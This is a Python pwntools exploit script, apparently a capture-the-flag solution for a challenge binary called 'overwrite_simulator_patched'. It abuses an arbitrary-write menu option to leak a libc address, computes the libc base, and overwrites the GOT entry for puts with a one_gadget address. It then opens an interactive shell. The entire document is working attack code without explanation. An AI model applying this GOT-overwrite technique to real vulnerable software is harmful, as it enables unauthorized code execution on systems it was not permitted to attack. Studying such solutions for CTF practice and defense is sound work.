#!/usr/bin/env python3


from pwn import *


e = ELF("./overwrite_simulator_patched")
r = process("./overwrite_simulator_patched")
#r = remote("gc1.eng.run",31140)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

def overwrite(address,value):
    r.sendlineafter(b">>",b"1")
    r.sendlineafter(b"Enter address to overwrite: ",f"{address}")
    r.sendlineafter(b"Enter data to be written: ",value)




address1  = 0x404074
overwrite(address1,b"A" * 8)
address2 = 0x404078
overwrite(address2,b"B" * 8)
r.sendlineafter(b">>",b"2")
r.recvuntil(b"BBBBBBBB")
libc_leak = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,'\x00'))
libc_base = libc_leak - libc.sym["IO_2_1_stdout"]
address3 = e.got["puts"]
overwrite(address3,p64(libc_base + 0xe6c81))
r.interactive()